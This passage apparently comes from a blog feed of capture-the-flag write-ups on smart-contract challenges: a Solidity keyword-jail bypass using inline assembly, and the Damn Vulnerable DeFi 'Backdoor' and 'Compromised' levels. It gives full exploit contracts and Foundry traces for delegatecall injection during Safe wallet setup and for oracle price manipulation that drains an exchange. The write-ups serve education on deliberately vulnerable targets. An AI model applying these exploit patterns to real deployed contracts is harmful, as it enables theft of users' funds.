<p>This contract takes arbitrary bytecode, deploys it using <code class="language-plaintext highlighter-rouge">create2</code>, and then executes its <code class="language-plaintext highlighter-rouge">main()</code> function. The flag we need to capture is a public state variable within this contract.</p>

<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract BytecodeRunner {
    string public flag = "wwf{REDACTED}";

    function run(
        bytes memory _bytecode,
        bytes32 _salt
    ) public returns (bool success, bytes memory result) {
        address newContract;
        assembly {
            newContract := create2(0, add(_bytecode, 0x20), mload(_bytecode), _salt)
        }
        // ...
        (success, result) = newContract.call(abi.encodeWithSelector(bytes4(keccak256("main()"))));
        require(success, "Execution of main() failed.");
    }
}
</code></pre>

<h4 id="the-jail-script-jailtalkpy">The Jail Script (<code class="language-plaintext highlighter-rouge">JailTalk.py</code>)</h4>

<p>This Python script takes our input, wraps it inside the main() function of a Solution contract, and checks our code against a blacklist of keywords. If the code is valid, it’s compiled and sent to the BytecodeRunner contract.</p>

<p>The key restriction is this blacklist:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">blacklist</span> <span class="o">=</span> <span class="p">[</span>
    <span class="sh">"</span><span class="s">flag</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">transfer</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">address</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">this</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">block</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">tx</span><span class="sh">"</span><span class="p">,</span>
    <span class="sh">"</span><span class="s">origin</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">gas</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">fallback</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">receive</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">selfdestruct</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">suicide</span><span class="sh">"</span>
<span class="p">]</span>
</code></pre></div></div>
<p>This prevents us from simply calling flag() or using address(this) to interact with the contract directly.</p>

<h4 id="vulnerability-and-approach">Vulnerability and Approach:</h4>

<p>The jail only sanitizes the high-level Solidity code, not the low-level operations. We can bypass the keyword restrictions by using inline assembly (Yul).</p>

<p>Since flag is a public state variable, the compiler automatically generates a public getter function for it. We can calculate its function selector:</p>

<ol>
  <li>
    <p>Function Signature: flag()</p>
  </li>
  <li>
    <p>Selector: bytes4(keccak256(“flag()”)) which is 0x890eba68</p>
  </li>
</ol>

<p>Our plan is to:</p>

<ol>
  <li>
    <p>Write our exploit in inline assembly within the main() function.</p>
  </li>
  <li>
    <p>Manually construct the calldata for the flag() function using its selector.</p>
  </li>
  <li>
    <p>Use the caller() opcode in assembly, which gives us the address of the BytecodeRunner contract that deployed our Solution contract.</p>
  </li>
  <li>
    <p>Use staticcall to call the flag() function on the caller() and retrieve the flag’s value.</p>
  </li>
</ol>

<h4 id="exploit">Exploit:</h4>
<p>This is the assembly code that is pasted into the challenge’s input prompt. It makes a low-level call without using any of the blacklisted keywords.</p>

<pre><code class="language-solidity">string memory my_result;

assembly {
    // Get a free memory pointer.
    let ptr := mload(0x40)

    // Store the 4-byte selector for "flag()" (0x890eba68) in memory.
    // shl(224, selector) left-aligns the 4 bytes in a 32-byte word.
    mstore(ptr, shl(224, 0x890eba68))

    // Perform a staticcall to the caller (BytecodeRunner contract).
    let success := staticcall(
        gas(),          // Forward all available gas
        caller(),       // The address of the BytecodeRunner contract
        ptr,            // Input data starts at `ptr` (our selector)
        4,              // Input data size is 4 bytes
        ptr,            // Output data will be written back to `ptr`
        256             // Allocate 256 bytes for the output buffer
    )

    if iszero(success) {
        revert(0, 0)
    }

    // The returned string is located at ptr + 32 bytes (offset).
    // The first 32 bytes contain the length of the string.
    my_result := add(ptr, 0x20)
    
    // Update the free memory pointer to avoid memory corruption.
    mstore(0x40, add(ptr, and(add(add(returndatasize(), 31), 32), not(31))))
}

return my_result;
</code></pre>

<h4 id="result">Result:</h4>
<p>After submitting the assembly code, the script executes it and returns the decoded string containing the flag.</p>
<pre><code class="language-Plaintext"> [True, b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00(wwf{y0u_4r3_7h3_7ru3_m4573r_0f_s0l1d17y}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00']

</code></pre>
<p><strong>Flag</strong>:</p>
<pre><code class="language-Plaintext">wwf{y0u_4r3_7h3_7ru3_m4573r_0f_s0l1d17y}
</code></pre>

<hr />

<p><strong>Challenge 2 is coming soon</strong></p>]]></content><author><name></name></author><category term="writeups" /><category term="ctfs" /><category term="blockchain" /><summary type="html"><![CDATA[I recently participated in WWCTF with my team, HackerTroupe. As usual, I solved the smart contract challenges.]]></summary></entry><entry><title type="html">Damn-Defi Challenges</title><link href="https://block-programr.github.io/writeups/2025/04/30/DamnDefi.html" rel="alternate" type="text/html" title="Damn-Defi Challenges" /><published>2025-04-30T00:00:00+00:00</published><updated>2025-04-30T00:00:00+00:00</updated><id>https://block-programr.github.io/writeups/2025/04/30/DamnDefi</id><content type="html" xml:base="https://block-programr.github.io/writeups/2025/04/30/DamnDefi.html"><![CDATA[<p><strong>GITHUB</strong>: <a href="https://  .com/SCATERLABs/CTFs/tree/0465130a63d25a8078a39b3241c9a8c7e101b7f1/Dam-vulnerable-Defi">View</a></p>

<h1 id="backdoor-challenge">Backdoor Challenge</h1>

<h2 id="challenge-overview">Challenge Overview:</h2>

<p>In this challenge, we are given a contract called WalletRegistry, which rewards users for creating a Safe wallet (a type of smart wallet). For each wallet registered, the registry sends 10 DVT tokens to the new wallet.</p>

<p>There are 4 users already registered as beneficiaries:</p>

<ol>
  <li>Alice</li>
  <li>Bob</li>
  <li>Charlie</li>
  <li>David</li>
</ol>

<p>The registry holds 40 DVT tokens in total (10 per user).
Your goal:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    Exploit the system and transfer all 40 DVT tokens to a recovery address — in a single transaction.
</code></pre></div></div>

<h2 id="vulnerability-explaination">Vulnerability Explaination:</h2>

<p>The core idea is to trick the wallet creation logic into executing malicious code during the setup of a new Safe wallet.</p>

<p>Here’s the catch:</p>

<ol>
  <li>
    <p>When creating a new wallet via the SafeProxyFactory, there’s an initializer parameter.</p>
  </li>
  <li>
    <p>This initializer is used to delegatecall to any contract during the Safe’s setup.</p>
  </li>
  <li>
    <p>This delegatecall runs in the context of the Safe, meaning it can modify the Safe’s storage (including approvals).</p>
  </li>
</ol>

<p>Even though the Safe looks like it’s owned by Alice/Bob/etc., we (the attacker) can inject a delegatecall that approves us to move funds on behalf of the new wallet.</p>

<h2 id="vulnerablecodein-walletregistrysol">VulnerableCode(in WalletRegistry.sol):</h2>
<pre><code class="language-solidity">if (bytes4(initializer[:4]) != Safe.setup.selector) {
    revert InvalidInitialization();
}
</code></pre>
<p>This just checks the initializer calls setup() but doesn’t validate the delegateCall target address.
Also:</p>
<pre><code class="language-solidity">//// During setup, it executes this.delegateCall(to, data)

</code></pre>
<p>So you can provide:</p>

<ol>
  <li>
    <p>to = address(attacker_contract)</p>
  </li>
  <li>
    <p>data = abi.encodeCall(attacker.approveTokens(…))</p>
  </li>
</ol>

<p>Which runs your function inside the Safe!</p>

<p>That’s the backdoor.</p>

<h2 id="exploit-strategy">Exploit Strategy:</h2>

<ol>
  <li>Deploy an attacker contract with a function that:</li>
</ol>

<pre><code class="language-solidity">function approveTokens(DamnValuableToken token, address attacker) external {
    token.approve(attacker, type(uint256).max);
}

</code></pre>
<ol>
  <li>
    <p>For each beneficiary:</p>

    <p>Use the legitimate SafeProxyFactory to create a Safe wallet.</p>

    <p>Inside the initializer, embed a delegatecall to our attacker contract.</p>

    <p>The delegatecall causes the newly created Safe wallet to approve us.</p>
  </li>
  <li>
    <p>As soon as the wallet is created:</p>

    <p>The registry automatically transfers 10 tokens to it.</p>

    <p>Immediately use transferFrom to steal the tokens from the new wallet.</p>
  </li>
  <li>
    <p>Repeat for all 4 users → collect 40 DVT → send to recovery address.</p>
  </li>
</ol>

<p>All in a single transaction</p>

<h2 id="exploit-code">Exploit Code:</h2>

<pre><code class="language-solidity">// challenge contract

 function test_backdoor() public checkSolvedByPlayer {
        //because the challenge only accept if there is a single transation
        BackDoorAttacker scater = new BackDoorAttacker(
            token,
            singletonCopy /*Safe wallet  */,
            walletFactory,
            users,
            recovery,
            walletRegistry,
            AMOUNT_TOKENS_DISTRIBUTED /*40 ether*/
        );
        scater.attack();
    }

//attacker Contract
contract BackDoorAttacker {
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    DamnValuableToken token;
    WalletRegistry walletRegistry;
    address[] beneficiaries;
    address recovery;

    constructor(
        DamnValuableToken _token,
        Safe _singletonCopy,
        SafeProxyFactory _walletFactory,
        address[] memory _beneficiaries,
        address _recovery,
        WalletRegistry _walletRegistry
    ) {
        token = _token;
        singletonCopy = _singletonCopy;
        walletFactory = _walletFactory;
        walletRegistry = _walletRegistry;
        beneficiaries = _beneficiaries;
        recovery = _recovery;
    }

    function approveTokens(DamnValuableToken _token, address spender) external {
        _token.approve(spender, type(uint256).max);
    }

    function attack() external {
        for (uint i = 0; i &lt; beneficiaries.length; i++) {
            address ;
            owners[0] = beneficiaries[i];

            bytes memory delegateCallData = abi.encodeCall(
                this.approveTokens,
                (token, address(this))
            );

            bytes memory initializer = abi.encodeCall(
                Safe.setup,
                (
                    owners,
                    1,
                    address(this),
                    delegateCallData,
                    address(0),
                    address(0),
                    0,
                    payable(address(0))
                )
            );

            SafeProxy proxy = walletFactory.createProxyWithCallback(
                address(singletonCopy),
                initializer,
                1,
                walletRegistry
            );

            token.transferFrom(address(proxy), address(this), token.balanceOf(address(proxy)));
        }

        token.transfer(recovery, token.balanceOf(address(this)));
    }
}

</code></pre>

<h2 id="proof-of-exploit">Proof of Exploit:</h2>

<div class="language-css highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">Suite</span> <span class="nt">result</span><span class="o">:</span> <span class="nt">ok</span><span class="o">.</span> <span class="err">1</span> <span class="nt">passed</span><span class="o">;</span> <span class="err">0</span> <span class="nt">failed</span><span class="o">;</span> <span class="err">0</span> <span class="nt">skipped</span><span class="o">;</span> <span class="nt">finished</span> <span class="nt">in</span> <span class="err">6</span><span class="o">.</span><span class="err">03</span><span class="nt">ms</span> <span class="o">(</span><span class="err">3</span><span class="o">.</span><span class="err">22</span><span class="nt">ms</span> <span class="nt">CPU</span> <span class="nt">time</span><span class="o">)</span>

<span class="nt">Ran</span> <span class="err">1</span> <span class="nt">test</span> <span class="nt">suite</span> <span class="nt">in</span> <span class="err">36</span><span class="o">.</span><span class="err">77</span><span class="nt">ms</span> <span class="o">(</span><span class="err">6</span><span class="o">.</span><span class="err">03</span><span class="nt">ms</span> <span class="nt">CPU</span> <span class="nt">time</span><span class="o">):</span> <span class="err">1</span> <span class="nt">tests</span> <span class="nt">passed</span><span class="o">,</span> <span class="err">0</span> <span class="nt">failed</span><span class="o">,</span> <span class="err">0</span> <span class="nt">skipped</span> <span class="o">(</span><span class="err">1</span> <span class="nt">total</span> <span class="nt">tests</span><span class="o">)</span>

</code></pre></div></div>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
 <span class="na">VM::getNonce(player</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x44E97aF4418b7a17AABD8090bEA0A471a366305C</span><span class="pi">]</span><span class="s">) [staticcall]</span>
    <span class="s">│   └─ ← [Return] </span><span class="m">1</span>
    <span class="s">├─ [0] VM::assertEq(1, 1, "Player executed more than one tx") [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [964] WalletRegistry::wallets(alice: [0x328809Bc894f92807417D2dAD6b7C998c1aFdac6]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] SafeProxy</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x638586a520Cf7fe0D5d26d42Ce6148dE4Dc2F433</span><span class="pi">]</span>
    <span class="s">├─ [0] VM::assertTrue(true, "User didn't register a wallet") [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [856] WalletRegistry::beneficiaries(alice: [0x328809Bc894f92807417D2dAD6b7C998c1aFdac6]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] </span><span class="kc">false</span>
    <span class="s">├─ [0] VM::assertFalse(false) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [964] WalletRegistry::wallets(bob: [0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] SafeProxy</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x7033C5922DB65A6DD48D061076431d61403490A3</span><span class="pi">]</span>
    <span class="s">├─ [0] VM::assertTrue(true, "User didn't register a wallet") [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [856] WalletRegistry::beneficiaries(bob: [0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] </span><span class="kc">false</span>
    <span class="s">├─ [0] VM::assertFalse(false) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [964] WalletRegistry::wallets(charlie: [0xea475d60c118d7058beF4bDd9c32bA51139a74e0]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] SafeProxy</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x983670C08Fd8C3e1B8A02520c8040B9550a81bb8</span><span class="pi">]</span>
    <span class="s">├─ [0] VM::assertTrue(true, "User didn't register a wallet") [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [856] WalletRegistry::beneficiaries(charlie: [0xea475d60c118d7058beF4bDd9c32bA51139a74e0]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] </span><span class="kc">false</span>
    <span class="s">├─ [0] VM::assertFalse(false) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [964] WalletRegistry::wallets(david: [0x671d2ba5bF3C160A568Aae17dE26B51390d6BD5b]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] SafeProxy</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x4B435f00E7cec80ac91d5dd13982629a35Ce63A1</span><span class="pi">]</span>
    <span class="s">├─ [0] VM::assertTrue(true, "User didn't register a wallet") [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [856] WalletRegistry::beneficiaries(david: [0x671d2ba5bF3C160A568Aae17dE26B51390d6BD5b]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] </span><span class="kc">false</span>
    <span class="s">├─ [0] VM::assertFalse(false) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [802] DamnValuableToken::balanceOf(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] 40000000000000000000 [4e19]</span>
    <span class="s">├─ [0] VM::assertEq(40000000000000000000 [4e19], 40000000000000000000 [4e19]) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">└─ ← [Stop]</span>

<span class="na">Suite result</span><span class="pi">:</span> <span class="s">ok. 1 passed; 0 failed; 0 skipped; finished in 6.03ms (3.22ms CPU time)</span>
</code></pre></div></div>

<h2 id="conclusion">Conclusion:</h2>
<p>This challenge teaches the danger of blindly allowing delegatecall in contract initialization. Just one line of unchecked delegatecall during setup gave us full control over the Safe wallet..</p>

<p>Key Lessons:</p>

<ol>
  <li>
    <p>Delegatecall executes in the caller’s storage context — be cautious!</p>
  </li>
  <li>
    <p>Validating the function selector (setup.selector) is not enough — also validate who and what it calls.</p>
  </li>
  <li>
    <p>Safe contracts and proxy patterns are powerful, but they need careful initialization logic.</p>
  </li>
</ol>

<hr />
<h1 id="compromised-challenge">Compromised Challenge</h1>

<h2 id="challenge-overview-1">Challenge Overview:</h2>

<p>A related on-chain exchange is selling (absurdly overpriced) collectibles called “DVNFT”, now at <strong>999 ETH</strong> each.</p>

<p>This price is fetched from an on-chain oracle, based on <strong>three trusted sources</strong> (reporters):</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">0x188Ea627E3531Db590e6f1D71ED83628d1933088</code></li>
  <li><code class="language-plaintext highlighter-rouge">0xA417D473c40a4d42BAd35f147c21eEa7973539D8</code></li>
  <li><code class="language-plaintext highlighter-rouge">0xab3600bF153A316dE44827e2473056d56B774a40</code></li>
</ul>

<p>Starting with just <strong>0.1 ETH</strong>, the goal is to:</p>
<ul>
  <li>Drain all <strong>999 ETH</strong> from the <code class="language-plaintext highlighter-rouge">Exchange</code> contract</li>
  <li>Send it to the designated <code class="language-plaintext highlighter-rouge">recovery</code> address</li>
</ul>

<hr />

<h2 id="vulnerability-explanation">Vulnerability Explanation:</h2>

<p>The price of the NFT (<code class="language-plaintext highlighter-rouge">DVNFT</code>) is determined by the <strong>median value</strong> submitted by the three trusted oracles. If an attacker controls or compromises <strong>two of the three sources</strong>, they can <strong>fully control the median price</strong>.</p>

<p>In this challenge, the two oracle addresses were compromised by leaked private keys encoded in the binary (in the real challenge). By simulating this compromise, we can:</p>

<ol>
  <li>Post a <strong>very low price (0 ETH)</strong> to buy the NFT for almost free</li>
  <li>Post a <strong>very high price (~999 ETH)</strong> to sell it back and drain the exchange</li>
</ol>

<p>This is a <strong>classic oracle manipulation attack</strong>.</p>

<hr />

<h2 id="vulnerable-code">Vulnerable Code:</h2>

<pre><code class="language-solidity">// This function used to change the oracle price ,if more than half of the prices change then control the prices 
//@audit this function to restrict to change the prices
function postPrice(
        string calldata symbol,
        uint256 newPrice
    ) external onlyRole(TRUSTED_SOURCE_ROLE) {
        _setPrice(msg.sender, symbol, newPrice);
    }
    //calculate the median after changing the prices(this case we can change two prices using above functioon we can manipulate the prices)


</code></pre>
<p>Since there are only 3 sources, compromising any 2 of them gives full control over the oracle’s output.</p>

<h3 id="exploit-strategy-1">Exploit Strategy:</h3>

<ol>
  <li>
    <p>Use the compromised sources to post a price of 0 ETH</p>
  </li>
  <li>
    <p>Call exchange.buyOne() to buy the NFT cheaply</p>
  </li>
  <li>
    <p>Update the price via compromised sources to 999 ETH</p>
  </li>
  <li>
    <p>Approve and sell the NFT back using exchange.sellOne()</p>
  </li>
  <li>
    <p>Collect(Attacker contract)the ETH proceeds and send them to recovery</p>
  </li>
</ol>

<h3 id="exploit-code-1">Exploit Code:</h3>
<pre><code class="language-solidity">// test_compromised function 
 function test_compromised() public checkSolved {
        address source1 = sources[0];
        address source2 = sources[1];
        OracleAttacker oracleAttacker = new OracleAttacker{
            value: address(this).balance
        }(oracle, exchange, nft, recovery);

        vm.prank(source1);
        oracle.postPrice(symbols[0], 0);
        vm.prank(source2);
        oracle.postPrice(symbols[1], 0);

        oracleAttacker.buy(); //buy the NFT for 0 wei

        vm.prank(source1);
        oracle.postPrice(symbols[0], EXCHANGE_INITIAL_ETH_BALANCE);
        vm.prank(source2);
        oracle.postPrice(symbols[1], EXCHANGE_INITIAL_ETH_BALANCE);

        oracleAttacker.sell(); //sell the NFT
        oracleAttacker.recovery(EXCHANGE_INITIAL_ETH_BALANCE); //transfer all the balance to the recovery address
    }

    //Attacker contract to exploit
    contract OracleAttacker is IERC721Receiver {
    TrustfulOracle private oracle;
    Exchange private exchange;
    DamnValuableNFT private token;
    address Recovery;
    uint256 public nft_id;

    constructor(
        TrustfulOracle _oracle,
        Exchange _exchange,
        DamnValuableNFT _nft,
        address _recovery
    ) payable {
        oracle = _oracle;
        exchange = _exchange;
        token = _nft;
        Recovery = _recovery;
    }

    //buy and sell the NFT to hijack the tokens and send to the recovery account

    function buy() external payable {
        nft_id = exchange.buyOne{value: 1}(); //attacker contract buy the NFT for 0 wei
    }

    function sell() external {
        token.approve(address(exchange), nft_id);//transfer nft from this contract to exchange contract
        exchange.sellOne(nft_id);
    }

    function recovery(uint256 amount) external {
        payable(Recovery).transfer(amount); //transfer all the balance from this contract  to the recovery address
    }

    //used for  ERC721 tokens accepting in this contract 
    function onERC721Received(
        address /*operator*/,
        address /*from*/,
        uint256 /*tokenId*/,
        bytes calldata /*data*/
    ) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}

</code></pre>

<h3 id="proof-of-exploit-1">Proof of Exploit:</h3>

<ol>
  <li>
    <p>Exchange’s ETH balance becomes 0</p>
  </li>
  <li>
    <p>Recovery address receives 999 ETH</p>
  </li>
  <li>
    <p>Player does not own any NFTs</p>
  </li>
  <li>
    <p>NFT price is restored back to 999 ETH</p>
  </li>
</ol>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">nithin@ScateR:~/SCATERLABs/CTFs/Dam-vulnerable-Defi$ forge test --match-test test_compromised -vvvv</span>
<span class="pi">[</span><span class="nv">⠒</span><span class="pi">]</span> <span class="s">Compiling...</span>
<span class="s">No files changed, compilation skipped</span>
<span class="s">Ran 1 test for test/compromised/Compromised.t.sol:CompromisedChallenge</span>
<span class="pi">[</span><span class="nv">PASS</span><span class="pi">]</span> <span class="na">test_compromised() (gas</span><span class="pi">:</span> <span class="s">674881)</span>
<span class="na">Traces</span><span class="pi">:</span>
  <span class="pi">[</span><span class="nv">765681</span><span class="pi">]</span> <span class="s">CompromisedChallenge::test_compromised()</span>
    <span class="s">├─ [396323] → new OracleAttacker@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f</span>
    <span class="s">│   └─ ← [Return] 1531 bytes of code</span>
    <span class="s">├─ [0] VM::prank(0x188Ea627E3531Db590e6f1D71ED83628d1933088)</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [11977] TrustfulOracle::postPrice("DVNFT", 0)</span>
    <span class="s">│   ├─ emit UpdatedPrice(source</span><span class="err">:</span> <span class="s">0x188Ea627E3531Db590e6f1D71ED83628d1933088, symbol</span><span class="err">:</span> <span class="s">0xc96df5ffc4b60595a3fe27a88456d253b504d73a51f5a4abf3dc9d13f057d1c9, oldPrice</span><span class="err">:</span> <span class="s">999000000000000000000 [9.99e20], newPrice</span><span class="err">:</span> <span class="s">0)</span>
    <span class="s">│   └─ ← [Stop]</span>
    <span class="s">├─ [0] VM::prank(0xA417D473c40a4d42BAd35f147c21eEa7973539D8)</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [11977] TrustfulOracle::postPrice("DVNFT", 0)</span>
    <span class="s">│   ├─ emit UpdatedPrice(source</span><span class="err">:</span> <span class="s">0xA417D473c40a4d42BAd35f147c21eEa7973539D8, symbol</span><span class="err">:</span> <span class="s">0xc96df5ffc4b60595a3fe27a88456d253b504d73a51f5a4abf3dc9d13f057d1c9, oldPrice</span><span class="err">:</span> <span class="s">999000000000000000000 [9.99e20], newPrice</span><span class="err">:</span> <span class="s">0)</span>
    <span class="s">│   └─ ← [Stop]</span>
    <span class="s">├─ [126851] OracleAttacker::buy()</span>
    <span class="s">│   ├─ [114616] Exchange::buyOne{value: 1}()</span>
    <span class="s">│   │   ├─ [3418] DamnValuableNFT::symbol() [staticcall]</span>
    <span class="s">│   │   │   └─ ← [Return] "DVNFT"</span>
    <span class="s">│   │   ├─ [16213] TrustfulOracle::getMedianPrice("DVNFT") [staticcall]</span>
    <span class="s">│   │   │   └─ ← [Return] </span><span class="m">0</span>
    <span class="s">│   │   ├─ [75167] DamnValuableNFT::safeMint(OracleAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])</span>
    <span class="s">│   │   │   ├─ emit Transfer(from</span><span class="err">:</span> <span class="s">0x0000000000000000000000000000000000000000, to</span><span class="na">: OracleAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">0)</span>
    <span class="s">│   │   │   ├─ [1259] OracleAttacker::onERC721Received(Exchange: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], 0x0000000000000000000000000000000000000000, 0, 0x)</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x150b7a02</span>
    <span class="s">│   │   │   └─ ← [Return] </span><span class="m">0</span>
    <span class="s">│   │   ├─ [55] OracleAttacker::receive{value: 1}()</span>
    <span class="s">│   │   │   └─ ← [Stop]</span>
    <span class="na">│   │   ├─ emit TokenBought(buyer: OracleAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">0, price</span><span class="err">:</span> <span class="s">0)</span>
    <span class="s">│   │   └─ ← [Return] </span><span class="m">0</span>
    <span class="s">│   └─ ← [Stop]</span>
    <span class="s">├─ [0] VM::prank(0x188Ea627E3531Db590e6f1D71ED83628d1933088)</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [5177] TrustfulOracle::postPrice("DVNFT", 999000000000000000000 [9.99e20])</span>
    <span class="na">│   ├─ emit UpdatedPrice(source</span><span class="pi">:</span> <span class="s">0x188Ea627E3531Db590e6f1D71ED83628d1933088, symbol</span><span class="err">:</span> <span class="s">0xc96df5ffc4b60595a3fe27a88456d253b504d73a51f5a4abf3dc9d13f057d1c9, oldPrice</span><span class="err">:</span> <span class="s">0, newPrice</span><span class="err">:</span> <span class="s">999000000000000000000 [9.99e20])</span>
    <span class="s">│   └─ ← [Stop]</span>
    <span class="s">├─ [0] VM::prank(0xA417D473c40a4d42BAd35f147c21eEa7973539D8)</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [5177] TrustfulOracle::postPrice("DVNFT", 999000000000000000000 [9.99e20])</span>
    <span class="na">│   ├─ emit UpdatedPrice(source</span><span class="pi">:</span> <span class="s">0xA417D473c40a4d42BAd35f147c21eEa7973539D8, symbol</span><span class="err">:</span> <span class="s">0xc96df5ffc4b60595a3fe27a88456d253b504d73a51f5a4abf3dc9d13f057d1c9, oldPrice</span><span class="err">:</span> <span class="s">0, newPrice</span><span class="err">:</span> <span class="s">999000000000000000000 [9.99e20])</span>
    <span class="s">│   └─ ← [Stop]</span>
    <span class="s">├─ [88512] OracleAttacker::sell()</span>
    <span class="s">│   ├─ [25464] DamnValuableNFT::approve(Exchange: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], 0)</span>
    <span class="na">│   │   ├─ emit Approval(owner: OracleAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f</span><span class="pi">]</span><span class="err">,</span> <span class="na">approved: Exchange</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">0)</span>
    <span class="s">│   │   └─ ← [Stop]</span>
    <span class="s">│   ├─ [61137] Exchange::sellOne(0)</span>
    <span class="s">│   │   ├─ [1051] DamnValuableNFT::ownerOf(0) [staticcall]</span>
    <span class="s">│   │   │   └─ ← [Return] OracleAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f</span><span class="pi">]</span>
    <span class="s">│   │   ├─ [1332] DamnValuableNFT::getApproved(0) [staticcall]</span>
    <span class="s">│   │   │   └─ ← [Return] Exchange</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264</span><span class="pi">]</span>
    <span class="s">│   │   ├─ [1418] DamnValuableNFT::symbol() [staticcall]</span>
    <span class="s">│   │   │   └─ ← [Return] "DVNFT"</span>
    <span class="s">│   │   ├─ [6213] TrustfulOracle::getMedianPrice("DVNFT") [staticcall]</span>
    <span class="s">│   │   │   └─ ← [Return] 999000000000000000000 [9.99e20]</span>
    <span class="s">│   │   ├─ [29511] DamnValuableNFT::transferFrom(OracleAttacker: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], Exchange</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264</span><span class="pi">]</span><span class="err">,</span> <span class="s">0)</span>
    <span class="na">│   │   │   ├─ emit Transfer(from: OracleAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: Exchange</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">0)</span>
    <span class="s">│   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   ├─ [4162] DamnValuableNFT::burn(0)</span>
